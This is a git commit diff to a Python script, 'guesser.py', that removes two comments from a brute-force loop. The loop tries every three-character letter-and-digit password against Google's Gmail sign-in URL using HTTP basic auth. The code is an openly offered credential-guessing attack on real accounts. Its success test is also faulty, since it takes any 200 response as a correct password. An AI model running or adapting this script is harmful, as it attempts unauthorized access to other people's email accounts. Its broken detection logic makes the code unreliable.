bee54466f7d5d30efe8e32d0c806f30fac501fa1
kingofhenz <93614808+kingofhenz@users.noreply.github.com>
2022-08-17 14:27:28 -0400

    Update guesser.py

--- guesser.py
+++ guesser.py
@@ -14,11 +14,9 @@ password = list(itertools.product(string.ascii_letters + string.digits, repeat=3
 for i in password:
     password = ''.join(i)
     response = requests.get("https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin", auth=(gmail, password))
-    #if the response is 200 the password is correct and the loop is broken
     if response.status_code == 200:
         print("Password is: " + password)
         break
-    #if the response is not 200 the password is not correct and the loop continues
     else:
         continue
 
